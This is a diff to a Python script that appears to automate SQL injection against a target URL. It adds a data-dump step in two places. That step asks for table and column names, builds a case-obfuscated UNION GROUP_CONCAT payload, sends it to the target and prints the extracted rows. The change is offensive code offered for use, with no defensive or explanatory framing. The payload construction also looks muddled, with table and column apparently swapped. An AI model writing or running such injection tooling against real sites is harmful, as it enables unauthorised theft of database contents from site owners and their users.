@@ -772,6 +772,8 @@ if target_url:
                                             print(f"[INFO] fetching database on {dbs} ", database_table)
                                             time.sleep(0.30)
                                         for database in database_all:
+                                            print(f"    Tables Name | Columns Name")
+                                            print("------------------------------------")
                                             print(f"[-] {database}")
                                             time.sleep(0.10)
                                         print("----------------------")
@@ -793,6 +795,8 @@ if target_url:
                                             print(f"[]fetching columns on table {database_table} in database : ", database)
                                             time.sleep(0.30)
                                         for database in database_all:
+                                            print(f"    Tables Name | Columns Name")
+                                            print("------------------------------------")
                                             print(f"[-] {database}")
                                             time.sleep(0.10)
                                         print("----------------------")
@@ -814,11 +818,27 @@ if target_url:
                                             print(f"[INFO] fetching database on {dbs} {database}")
                                             time.sleep(0.30)
                                         for database in database_all:
+                                            print(f"    Tables Name | Columns Name")
+                                            print("------------------------------------")
                                             print(f"[-] {database}")
                                             time.sleep(0.10)
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
+                                        print("")
+                                        print("")
+                                        print("You Readly Dump Database Tables ? :")
+                                        text_dump = input("Name Tables : ")
+                                        text_dump2 = input("Name Columns : ")
+                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump},'::'version()+SEPARATOR+'<br>')+FROM+{text_dump2})"
+                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
+                                        results_dump = requests.get(target_url + payload_dump)
+                                        texts_html = results_dump.text
+                                        checking_data = r"\b\w+::\b"
+                                        data_all = re.findall(checking_data, texts_html)
+                                        for data in data_all:
+                                            print("[+]", data)
+                                        exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
                                     
@@ -1548,6 +1568,8 @@ if target_url:
                                             print(f"[INFO] fetching database on {dbs} ", database_table)
                                             time.sleep(0.30)
                                         for database in database_all:
+                                            print(f"    Tables Name | Columns Name")
+                                            print("------------------------------------")
                                             print(f"[-] {database}")
                                             time.sleep(0.10)
                                         print("----------------------")
@@ -1569,6 +1591,8 @@ if target_url:
                                             print(f"[]fetching columns on table {database_table} in database : ", database)
                                             time.sleep(0.30)
                                         for database in database_all:
+                                            print(f"    Tables Name | Columns Name")
+                                            print("------------------------------------")
                                             print(f"[-] {database}")
                                             time.sleep(0.10)
                                         print("----------------------")
@@ -1590,11 +1614,27 @@ if target_url:
                                             print(f"[INFO] fetching database on {dbs} {database}")
                                             time.sleep(0.30)
                                         for database in database_all:
+                                            print(f"    Tables Name | Columns Name")
+                                            print("------------------------------------")
                                             print(f"[-] {database}")
                                             time.sleep(0.10)
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
+                                        print("")
+                                        print("")
+                                        print("You Readly Dump Database Tables ? :")
+                                        text_dump = input("Name Tables : ")
+                                        text_dump2 = input("Name Columns : ")
+                                        modu = f"(SElECT+GrOuP_cOnCaT({text_dump},'::'version()+SEPARATOR+'<br>')+FROM+{text_dump2})"
+                                        payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
+                                        results_dump = requests.get(target_url + payload_dump)
+                                        texts_html = results_dump.text
+                                        checking_data = r"\b\w+::\b"
+                                        data_all = re.findall(checking_data, texts_html)
+                                        for data in data_all:
+                                            print("[+]", data)
+                                        exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
         
